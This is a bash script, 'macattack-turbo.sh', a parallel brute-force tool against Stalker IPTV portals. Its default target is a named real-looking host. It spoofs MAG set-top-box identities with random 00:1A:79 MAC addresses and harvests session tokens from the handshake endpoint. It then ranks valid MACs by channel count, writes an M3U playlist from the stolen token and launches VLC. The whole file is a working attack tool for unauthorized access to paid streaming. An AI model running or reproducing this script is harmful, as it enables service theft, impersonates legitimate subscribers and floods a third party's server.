#!/bin/bash
# macattack-turbo.sh — Parallel Stalker brute force + instant play
# Usage: ./macattack-turbo.sh [count] [portal_url] [workers]

COUNT="${1:-100}"
PORTAL="${2:-http://www.streamtv.to:8080}"
WORKERS="${3:-20}"
HANDLE="${PORTAL}/stalker_portal/server/load.php?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml"
CHANNELS_URL="${PORTAL}/stalker_portal/server/load.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
OUTFILE="valid_macs.txt"
TMPDIR="/tmp/macattack_$$"

mkdir -p "$TMPDIR"

# --- TEST MAC (called in parallel via xargs) ---
test_mac() {
    MAC="$1"
    SERIAL="$(openssl rand -hex 7 | tr '[:lower:]' '[:upper:]')"
    TMPFILE="$TMPDIR/${MAC//:/}"

    RESP=$(curl -s --max-time 5 \
      -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 5 rev: 2116 Mobile Safari/533.3" \
      -b "mac=$MAC; sn=$SERIAL; stb_lang=en; timezone=Europe/London" \
      "$HANDLE" 2>/dev/null)

    TOK=$(echo "$RESP" | grep -oP '"[Tt]oken":"\K[^"]+' | head -1)

    if [ -n "$TOK" ]; then
        CHANS=$(curl -s --max-time 8 \
          -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3" \
          -H "Authorization: Bearer $TOK" \
          -b "mac=$MAC; token=$TOK; sn=$SERIAL" \
          "$CHANNELS_URL" 2>/dev/null)

        CH_NUM=$(echo "$CHANS" | grep -oP '"id":"\K[^"]+' | wc -l)
        echo "$MAC|$TOK|$CH_NUM" > "$TMPFILE"
        echo "[+] $MAC  -  $CH_NUM channels  -  token ${TOK:0:16}..."
        echo "$MAC" >> "$OUTFILE"
    fi
}
export -f test_mac
export PORTAL HANDLE CHANNELS_URL OUTFILE TMPDIR

# --- GENERATE MACS ---
echo "[*] macattack-turbo  -  $COUNT MACs, $WORKERS workers"
echo "[*] Portal: $PORTAL"
echo ""

for i in $(seq 1 "$COUNT"); do
    echo "00:1A:79:$(printf '%02X' $((RANDOM % 256))):$(printf '%02X' $((RANDOM % 256))):$(printf '%02X' $((RANDOM % 256)))"
done | xargs -P "$WORKERS" -I{} bash -c 'test_mac "{}"'

# --- SUMMARY ---
VALID=$(ls "$TMPDIR" 2>/dev/null | wc -l)
echo ""
echo "[*] Done. $VALID valid MACs found"

if [ "$VALID" -gt 0 ]; then
    BEST=$(cat "$TMPDIR"/* | sort -t'|' -k3 -nr | head -1)
    BEST_MAC=$(echo "$BEST" | cut -d'|' -f1)
    BEST_TOK=$(echo "$BEST" | cut -d'|' -f2)
    BEST_CH=$(echo "$BEST" | cut -d'|' -f3)

    echo "[+] Best MAC: $BEST_MAC ($BEST_CH channels)"

    M3U="/tmp/turbo_best_${BEST_MAC//:/}.m3u"
    echo "[*] Generating M3U for best MAC..."

    CH_DETAIL=$(curl -s --max-time 10 \
      -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3" \
      -H "Authorization: Bearer $BEST_TOK" \
      -b "mac=$BEST_MAC; token=$BEST_TOK" \
      "$CHANNELS_URL" 2>/dev/null)

    echo "#EXTM3U" > "$M3U"
    echo "$CH_DETAIL" | grep -oP '"id":"[^"]+","number":"[^"]+","name":"[^"]+"' | while read -r line; do
        CID=$(echo "$line" | grep -oP '"id":"\K[^"]+')
        CNAME=$(echo "$line" | grep -oP '"name":"\K[^"]+')
        echo "#EXTINF:-1,$CNAME" >> "$M3U"
        echo "${PORTAL}/stalker_portal/server/tools/playlist.php?mac=${BEST_MAC}&token=${BEST_TOK}&uid=${CID}" >> "$M3U"
    done

    TOTAL=$(grep -c '#EXTINF' "$M3U")
    echo "[+] M3U saved: $M3U ($TOTAL channels)"

    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    echo "[*] Launching VLC with zero-lag cache..."
    if [ -x "$SCRIPT_DIR/vlc-stalker.sh" ]; then
        nohup "$SCRIPT_DIR/vlc-stalker.sh" 300 "$M3U" >/dev/null 2>&1 &
    else
        nohup vlc --play-and-exit --ipv4-timeout=3000 --no-playlist-autostart --no-playlist-tree --network-caching=300 --live-caching=0 --file-caching=50 --http-caching=300 --clock-synthro=0 --no-drop-late-frames --no-skip-frames --avcodec-hw=any --rtsp-tcp --no-video-title-show "$M3U" >/dev/null 2>&1 &
    fi
    echo "[+] VLC launched - enjoy"
fi

rm -rf "$TMPDIR"